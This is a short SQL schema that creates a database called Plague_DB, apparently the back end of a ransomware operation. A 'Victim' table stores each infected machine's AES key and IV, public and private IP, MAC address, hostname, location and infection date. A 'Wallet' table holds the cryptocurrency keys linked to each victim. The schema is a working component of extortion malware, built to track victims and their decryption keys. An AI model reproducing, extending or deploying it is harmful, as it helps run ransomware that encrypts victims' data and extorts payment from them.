DROP    DATABASE Plague_DB;
CREATE  DATABASE Plague_DB;
USE Plague_DB;

CREATE TABLE Wallet (
    WalletID        INT PRIMARY KEY,
    Public_Key      varchar(40),
    Private_Key     varchar(60)
);

CREATE TABLE Victim (
    VictimID        int AUTO_INCREMENT PRIMARY KEY,
    AesKey          varchar(512),
    IV              varchar(256),
    PUB_IP          varchar(45),
    PRIV_IP         varchar(45),
    MAC             varchar(20),
    Hostname        varchar(40),
    City            varchar(50),
    Region          varchar(50),
    Country         varchar(50),
    InfectionDate   DATETIME,
    WalletID        INT,
    FOREIGN KEY (WalletID) REFERENCES Wallet(WalletID)
);